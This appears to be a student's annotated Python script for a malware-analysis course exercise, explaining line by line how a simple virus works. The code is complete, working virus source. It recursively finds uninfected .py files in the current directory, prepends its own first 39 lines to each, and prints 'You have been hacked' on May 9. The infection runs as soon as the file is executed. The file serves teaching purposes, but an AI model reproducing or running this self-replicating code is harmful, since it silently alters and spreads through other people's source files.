#Not making this file executable lol

# Script Name:                  ops301d8-day14
# Author:                       Jonathan McMullin
# Date of latest revision:      06/15/2023
# Purpose:                      Python Malware Analysis


# these scripts imports the python modules os and datetime.
import os
import datetime

#this sets the Signature to the string "VIRUS"
SIGNATURE = "VIRUS"

# This function identifies which files have been infected already and adds those that haven't been to an array

#This establishes a function for the variable "path"
def locate(path):
# Creates an empty array
    files_targeted = []
    #this line returns a list of all items at the directory path
    filelist = os.listdir(path)
    #this establishes a for-loop that that iterates over each file name in the directory
    for fname in filelist:
        #This if statement checks if the file is a directory and
        if os.path.isdir(path+"/"+fname):
            #if it is a directory, it recursively searches 
            # and adds all subordinate files within the directory to the "files_targeted" list
            files_targeted.extend(locate(path+"/"+fname))
        # This elif statement checks if the last three characters of the file name make it an executable python code
        elif fname[-3:] == ".py":
            # This creates a false boolean variable for any .py file that it finds to track if it has already 
            # infected the file or not
            infected = False
            # This for loop opens the file and checks the contents
            for line in open(path+"/"+fname):
                # This if statement checks if the file has been infected already or not
                if SIGNATURE in line:
                    # if "virus" is present, the boolean value is changed to true and the script knows it is infected already
                    infected = True
                    # the script breaks out of the inner loop
                    break
            # This if statement checks if the file has not been infected yet    
            if infected == False:
                # This adds all uninfected files to the files_targeted array
                files_targeted.append(path+"/"+fname)
    # This ends the infection detection function, creating a comprehensive list of files that have not been infected yet 
    return files_targeted

# This function takes 39 lines of code from a virus file and inserts into the beginning of every file identified in the previous function as not infected

# This establishes an infect function using the files_targeted array from the previous function
def infect(files_targeted):
    # This opens file named "__file__" and provides the absolute path of a file
    virus = open(os.path.abspath(__file__))
    # This creates an empty string for virusstring
    virusstring = ""
    # This for loop iterates over a defined number of lines (i) in the file 'virus'
    for i,line in enumerate(virus):
        # this if statment is used if the there are between 0 and 39 lines in the 'virus' file
        if 0 <= i < 39:
            #this adds the "virus string" line to the file
            virusstring += line
    # this closes the virus file
    virus.close
    #this for loop iterates over all file names in the targeted array
    for fname in files_targeted:
        #This opens the file and assigns it the variable f
        f = open(fname)
         # This reads the "f" file and stores the contents in variable 'temp'
        temp = f.read()
        # this closes the 'f' file
        f.close()
        # This opens the file with write privledges
        f = open(fname,"w")
        # this adds the virus string to the front of the original file contents
        f.write(virusstring + temp)
        # This closes the file
        f.close()

# This function prints "you have been hacked" on May 9th 

#This creates a function 'detonate'
def detonate():
    #This if statement checks if the date is the 9th of May
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # prints "You have been hacked" to the screen
        print("You have been hacked")

# When called in order these functions identify what files to infect, infects them 
# with malicious code from a file, and then prints "you have been hacked" on May 9th

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()